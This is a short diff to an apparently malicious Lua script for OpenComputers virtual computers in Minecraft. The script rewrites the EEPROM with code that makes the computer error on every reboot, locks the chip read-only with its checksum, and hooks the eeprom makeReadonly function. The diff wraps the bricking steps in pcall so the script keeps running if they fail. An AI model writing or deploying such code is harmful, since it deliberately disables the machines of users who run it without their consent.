@@ -59,13 +59,19 @@ function lol()
 
 end
 
-ef.setLabel("OCboy3ッ.txt")
--- Make it so when the user reboots their OpenComputer, it will error
-ef.set([[
-  error("OCboy3ッ.txt")
-]])
-ef.makeReadonly()
+-- pcalled it so it would not break or smth
+pcall(function()
+  
+  ef.setLabel("OCboy3ッ.txt")
+  -- Make it so when the user reboots their OpenComputer, it will error
+  ef.set([[
+    error("OCboy3ッ.txt")
+  ]])
+      
+  ef.makeReadonly(ef.getChecksum())
 
+end)
+    
 component.proxy(cl("eeprom")()).makeReadonly = function(...) -- component.eeprom.makeReadonly("test")
   lol()
 end
